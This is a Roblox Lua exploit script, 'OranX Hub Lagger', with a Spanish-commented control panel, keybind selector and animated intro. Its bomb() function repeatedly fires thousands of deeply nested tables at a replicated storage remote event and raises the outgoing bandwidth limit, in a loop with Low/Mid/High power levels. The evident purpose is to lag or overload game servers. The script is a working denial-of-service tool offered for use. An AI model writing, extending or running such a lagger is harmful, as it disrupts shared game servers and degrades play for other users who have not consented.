--[[
========================================

╔════════════════════════╗
║          OranX Hub Lagger   ║
╚════════════════════════╝
Script by AaronosoWC
Version: OranX

========================================
]]

--// ORANX HUB - PANEL CON BORDES NARANJA
--// Selector de tecla/boton personalizable

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local TS = TweenService
local player = Players.LocalPlayer
local ConfigFile = "OranXHubConfig.json"

local NIVELES = {
    Low     = { poder = 25 },
    Mid     = { poder = 32 },
    High    = { poder = 70 }
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false

local ORANX = Color3.fromRGB(255, 140, 0)
local ORANX_CLARO = Color3.fromRGB(255, 180, 80)
local BLANCO = Color3.fromRGB(255, 255, 255)
local NEGRO = Color3.fromRGB(0, 0, 0)

local UI_CONFIG = {
    MainBg       = BLANCO,
    TitleColor   = ORANX,
    TextColor    = NEGRO,
    ButtonInact  = BLANCO,
    ButtonAct    = ORANX,
    ToggleOff    = Color3.fromRGB(200, 200, 200),
    ToggleOn     = ORANX,
    LockColor    = ORANX,
    UnlockColor  = Color3.fromRGB(150, 150, 150),
    Font         = Enum.Font.GothamBold,
    BorderColor  = ORANX,
    SelectorBg   = Color3.fromRGB(240, 240, 240),
    SelectorAct  = ORANX,
}

local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, lockButton
local titleLabel, textEnable, keybindButton, textLagger, toggleClick

local function actualizarBotonesNivel()
    if nivelActual == "Low" then
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonAct
        btnLow.TextColor3 = BLANCO
        btnLow.BorderSizePixel = 0
    else
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnLow.TextColor3 = NEGRO
        btnLow.BorderSizePixel = 1
        btnLow.BorderColor3 = ORANX
    end
    if nivelActual == "Mid" then
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonAct
        btnMid.TextColor3 = BLANCO
        btnMid.BorderSizePixel = 0
    else
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnMid.TextColor3 = NEGRO
        btnMid.BorderSizePixel = 1
        btnMid.BorderColor3 = ORANX
    end
    if nivelActual == "High" then
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonAct
        btnHigh.TextColor3 = BLANCO
        btnHigh.BorderSizePixel = 0
    else
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnHigh.TextColor3 = NEGRO
        btnHigh.BorderSizePixel = 1
        btnHigh.BorderColor3 = ORANX
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ON" or "OFF"
        if laggerActive then
            toggleClick.BackgroundColor3 = ORANX
            toggleClick.TextColor3 = BLANCO
        else
            toggleClick.BackgroundColor3 = BLANCO
            toggleClick.TextColor3 = NEGRO
        end
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
    local targetColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos,
        BackgroundColor3 = targetColor
    }):Play()
    TweenService:Create(toggleContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundColor3 = targetColor
    }):Play()

    toggleClick.Text = laggerActive and "ON" or "OFF"
    if laggerActive then
        toggleClick.BackgroundColor3 = ORANX
        toggleClick.TextColor3 = BLANCO
    else
        toggleClick.BackgroundColor3 = BLANCO
        toggleClick.TextColor3 = NEGRO
    end

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

if CoreGui:FindFirstChild("OranXHub_UI") then CoreGui.OranXHub_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OranXHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
mainFrame.BorderSizePixel = 3
mainFrame.BorderColor3 = ORANX
mainFrame.Size = UDim2.new(0, 200, 0, 100)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -50)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

local bordeStroke = Instance.new("UIStroke", mainFrame)
bordeStroke.Color = ORANX
bordeStroke.Thickness = 2
bordeStroke.Transparency = 0
bordeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 10, 0, 0)
titleLabel.Size = UDim2.new(1, -45, 0, 28)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "ORANX HUB"
titleLabel.TextColor3 = ORANX
titleLabel.TextSize = 14
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 1

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 1
lockButton.Position = UDim2.new(1, -50, 0, 3)
lockButton.Size = UDim2.new(0, 45, 0, 18)
lockButton.Font = UI_CONFIG.Font
lockButton.TextSize = 10
lockButton.TextColor3 = UI_CONFIG.TextColor
lockButton.AutoButtonColor = false
lockButton.ZIndex = 1
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

textEnable = Instance.new("TextLabel", mainFrame)
textEnable.BackgroundTransparency = 1
textEnable.Position = UDim2.new(0, 10, 0, 30)
textEnable.Size = UDim2.new(0, 40, 0, 16)
textEnable.Font = UI_CONFIG.Font
textEnable.Text = "ENABLE"
textEnable.TextColor3 = UI_CONFIG.TextColor
textEnable.TextSize = 10
textEnable.TextXAlignment = Enum.TextXAlignment.Left
textEnable.ZIndex = 1

textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 52, 0, 30)
textLagger.Size = UDim2.new(0, 45, 0, 16)
textLagger.Font = UI_CONFIG.Font
textLagger.Text = "LAGGER"
textLagger.TextColor3 = UI_CONFIG.TextColor
textLagger.TextSize = 10
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.ZIndex = 1

keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
keybindButton.Position = UDim2.new(0, 100, 0, 30)
keybindButton.Size = UDim2.new(0, 24, 0, 16)
keybindButton.Font = UI_CONFIG.Font
keybindButton.Text = "M"
keybindButton.TextColor3 = NEGRO
keybindButton.TextSize = 9
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 1
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 3)
actualizarKeybindButton()

toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -50, 0, 30)
toggleContainer.Size = UDim2.new(0, 42, 0, 20)
toggleContainer.ZIndex = 1
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0, 18, 0, 18)
toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
toggleBall.ZIndex = 1
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = BLANCO
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 2
toggleClick.Font = UI_CONFIG.Font
toggleClick.Text = "OFF"
toggleClick.TextSize = 9
toggleClick.TextColor3 = NEGRO
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
local corner = Instance.new("UICorner", toggleClick)
corner.CornerRadius = UDim.new(1,0)

keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "..."
    keybindButton.BackgroundColor3 = ORANX
    keybindButton.TextColor3 = BLANCO
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end

    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end

    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        SaveConfig()
        listeningForInput = false
        keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
        keybindButton.TextColor3 = NEGRO
    end
end)

local btnY = 62
local btnW = 60
local btnH = 24
local espaciado = 5
local margenIzq = 5

local function aplicarEfectoHover(btn)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = ORANX_CLARO,
            TextColor3 = BLANCO
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = btn.BackgroundColor3,
            TextColor3 = btn.TextColor3
        }):Play()
    end)
end

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "LOW"
btnLow.TextColor3 = NEGRO
btnLow.TextSize = 10
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = ORANX
btnLow.ZIndex = 1
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 5)
btnLow.MouseButton1Click:Connect(function()
    nivelActual = "Low"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnLow)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "MID"
btnMid.TextColor3 = NEGRO
btnMid.TextSize = 10
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = ORANX
btnMid.ZIndex = 1
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 5)
btnMid.MouseButton1Click:Connect(function()
    nivelActual = "Mid"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnMid)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "HIGH"
btnHigh.TextColor3 = NEGRO
btnHigh.TextSize = 10
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = ORANX
btnHigh.ZIndex = 1
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 5)
btnHigh.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnHigh)

actualizarBotonesNivel()
actualizarSwitch()

local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)

local function mostrarIntro()
    local introGui = Instance.new("ScreenGui")
    introGui.Name = "OranXIntro"
    introGui.Parent = CoreGui
    introGui.IgnoreGuiInset = true
    introGui.DisplayOrder = 100
    introGui.ResetOnSpawn = false

    local darkBg = Instance.new("Frame", introGui)
    darkBg.Size = UDim2.new(1, 0, 1, 0)
    darkBg.BackgroundColor3 = Color3.fromRGB(2, 4, 14)
    darkBg.BackgroundTransparency = 1
    darkBg.BorderSizePixel = 0
    darkBg.ZIndex = 1

    local bgGrad = Instance.new("UIGradient", darkBg)
    bgGrad.Color = ColorSequence.new(Color3.fromRGB(8, 12, 30), Color3.fromRGB(0, 0, 4))
    bgGrad.Rotation = 90

    local stars = {}
    for i = 1, 60 do
        local s = Instance.new("Frame", introGui)
        local size = math.random(1, 4)
        s.Size = UDim2.new(0, size, 0, size)
        s.Position = UDim2.new(math.random(), 0, math.random(), 0)
        s.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        s.BackgroundTransparency = 1
        s.BorderSizePixel = 0
        s.ZIndex = 2
        Instance.new("UICorner", s).CornerRadius = UDim.new(1, 0)
        stars[i] = {
            frame = s,
            speed = 0.005 + math.random() * 25/1000,
            targetTrans = 0.05 + math.random() * 35/100,
        }
    end

    local introActive = true
    local driftConn = RunService.Heartbeat:Connect(function(dt)
        if not introActive then return end
        for _, sd in ipairs(stars) do
            local pos = sd.frame.Position
            local newX = pos.X.Scale - sd.speed
            if newX < -0.02 then newX = 1.02 end
            sd.frame.Position = UDim2.new(newX, 0, pos.Y.Scale, pos.Y.Offset)
        end
    end)

    local center = Instance.new("Frame", introGui)
    center.AnchorPoint = Vector2.new(0.5, 0.5)
    center.Position = UDim2.new(0.5, 0, 0.5, 0)
    center.Size = UDim2.new(0, 600, 0, 240)
    center.BackgroundTransparency = 1
    center.ZIndex = 5

    local lineTop = Instance.new("Frame", center)
    lineTop.AnchorPoint = Vector2.new(0.5, 0)
    lineTop.Position = UDim2.new(0.5, 0, 0, 60)
    lineTop.Size = UDim2.new(0, 0, 0, 2)
    lineTop.BackgroundColor3 = ORANX
    lineTop.BorderSizePixel = 0
    lineTop.ZIndex = 6

    local title = Instance.new("TextLabel", center)
    title.Size = UDim2.new(1, 0, 0, 80)
    title.Position = UDim2.new(0, 0, 0, 80)
    title.BackgroundTransparency = 1
    title.Text = "ORANX HUB"
    title.TextColor3 = ORANX
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 76
    title.TextTransparency = 1
    title.TextStrokeTransparency = 1
    title.TextStrokeColor3 = ORANX
    title.ZIndex = 7

    local subtitle = Instance.new("TextLabel", center)
    subtitle.Size = UDim2.new(1, 0, 0, 24)
    subtitle.Position = UDim2.new(0, 0, 0, 170)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "by AaronosoWC"
    subtitle.TextColor3 = ORANX
    subtitle.Font = Enum.Font.GothamMedium
    subtitle.TextSize = 18
    subtitle.TextTransparency = 1
    subtitle.ZIndex = 7

    local lineBot = Instance.new("Frame", center)
    lineBot.AnchorPoint = Vector2.new(0.5, 1)
    lineBot.Position = UDim2.new(0.5, 0, 1, -10)
    lineBot.Size = UDim2.new(0, 0, 0, 2)
    lineBot.BackgroundColor3 = ORANX
    lineBot.BorderSizePixel = 0
    lineBot.ZIndex = 6

    TweenService:Create(title, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        TextTransparency = 0,
        TextStrokeTransparency = 0
    }):Play()

    TweenService:Create(subtitle, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        TextTransparency = 0
    }):Play()

    TweenService:Create(lineTop, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(0.6, 0, 0, 2)
    }):Play()

    TweenService:Create(lineBot, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(0.6, 0, 0, 2)
    }):Play()

    TweenService:Create(darkBg, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.1
    }):Play()

    task.delay(3.5, function()
        TweenService:Create(darkBg, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            BackgroundTransparency = 1
        }):Play()
        task.wait(0.6)
        introGui:Destroy()
        if driftConn then driftConn:Disconnect() end
    end)
end

mostrarIntro()
